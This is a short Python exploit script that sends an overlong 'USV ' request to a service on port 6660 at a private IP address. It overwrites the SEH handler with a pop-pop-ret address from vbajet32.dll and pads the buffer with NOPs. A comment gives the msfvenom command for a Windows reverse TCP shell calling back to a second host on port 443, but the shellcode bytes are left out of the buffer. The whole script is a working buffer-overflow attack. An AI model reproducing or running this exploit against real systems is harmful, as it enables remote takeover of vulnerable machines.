#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=6660

buf = "USV "
buf+= "\x90" * 962
buf+= "\xeb\x06\x90\x90" # JMP SHORT 6, NOP Padding
buf+= "\x9f\xa1\x11\x1b" # SEH Overwrite - pop-pop-ret from vbajet32.dll 0x1b11a19f

buf+= "\x90" * 16 # NOP padding before shellcode

# sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.108 lport=443 EXITFUNC=thread -b "\x00\x0a\0x0d" -f python
# Payload size: 348 bytes

buf+= "\x90" * (2504 - len(buf))
buf+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buf)
sock.close()

